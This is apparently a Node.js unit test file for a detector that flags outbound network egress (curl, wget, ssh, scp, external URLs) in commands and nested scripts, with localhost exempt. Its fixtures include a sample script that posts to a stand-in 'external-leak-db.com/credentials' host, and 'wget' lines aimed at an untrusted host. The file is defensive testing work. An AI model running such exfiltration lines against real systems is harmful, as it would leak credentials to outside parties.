/**
 * Unit Tests for Outbound Network Egress Detector
 * Path: tools/kernel/__tests__/detect-network-egress.test.cjs
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const { detectNetworkEgress, stripComments, resolveScriptPaths } = require('../lib/detect-network-egress.cjs');

test('Outbound Network Egress Detector', async (t) => {

  await t.test('stripComments', () => {
    // JS comments
    const jsText = `
      // This is a single-line comment with a URL: http://untrusted.com/leak
      const x = 12; /* This is a multi-line comment with a command: curl */
      const url = "http://localhost:8080";
    `;
    const jsClean = stripComments(jsText, '.js');
    assert.ok(!jsClean.includes('http://untrusted.com/leak'));
    assert.ok(!jsClean.includes('curl'));
    assert.ok(jsClean.includes('const x = 12;'));
    assert.ok(jsClean.includes('localhost'));

    // Python / Bash comments
    const pyText = `
      # This is a python comment with a command: wget http://untrusted.com
      url = "https://127.0.0.1/query#anchor" # Keep anchor URL fragments
      # Another comment
    `;
    const pyClean = stripComments(pyText, '.py');
    assert.ok(!pyClean.includes('wget'));
    assert.ok(pyClean.includes('127.0.0.1'));
    assert.ok(pyClean.includes('#anchor'));
  });

  await t.test('resolveScriptPaths', () => {
    const cmd1 = 'node tools/sheet-builder/build.cjs --run scripts/run.py';
    const paths1 = resolveScriptPaths(cmd1);
    assert.deepStrictEqual(paths1, ['tools/sheet-builder/build.cjs', 'scripts/run.py']);

    const cmd2 = 'bash run_tests.sh';
    const paths2 = resolveScriptPaths(cmd2);
    assert.deepStrictEqual(paths2, ['run_tests.sh']);
  });

  await t.test('detectNetworkEgress - top level command', () => {
    // Outbound Executables
    assert.ok(detectNetworkEgress('curl https://api.github.com').hasEgress);
    assert.ok(detectNetworkEgress('wget http://untrusted.com').hasEgress);
    assert.ok(detectNetworkEgress('ssh user@host').hasEgress);
    assert.ok(detectNetworkEgress('scp file user@host:/path').hasEgress);

    // External URL literals
    assert.ok(detectNetworkEgress('node my-script.js --target=https://api.stripe.com/v1').hasEgress);

    // Loopback/Localhost exclusions (should pass cleanly)
    assert.ok(!detectNetworkEgress('node my-script.js --target=http://localhost:3000').hasEgress);
    assert.ok(!detectNetworkEgress('node my-script.js --target=http://127.0.0.1:8080').hasEgress);
    assert.ok(!detectNetworkEgress('node my-script.js --target=http://[::1]:9000').hasEgress);
  });

  await t.test('detectNetworkEgress - nested script scan', () => {
    // Create temporary test scripts
    const tmpDir = path.join(__dirname, 'tmp-network-test');
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

    const safeScript = path.join(tmpDir, 'safe.js');
    fs.writeFileSync(safeScript, `
      // Benign script
      const fs = require('fs');
      console.log("Local operation complete.");
    `, 'utf8');

    const unsafeScript = path.join(tmpDir, 'unsafe.js');
    fs.writeFileSync(unsafeScript, `
      // Unsafe script importing axios
      const axios = require('axios');
      axios.post('https://external-leak-db.com/credentials');
    `, 'utf8');

    // Safe execution check
    assert.ok(!detectNetworkEgress(`node ${safeScript}`).hasEgress);

    // Unsafe execution check (detects post to external-leak-db.com)
    assert.ok(detectNetworkEgress(`node ${unsafeScript}`).hasEgress);

    // Cleanup
    fs.unlinkSync(safeScript);
    fs.unlinkSync(unsafeScript);
    fs.rmdirSync(tmpDir);
  });
});
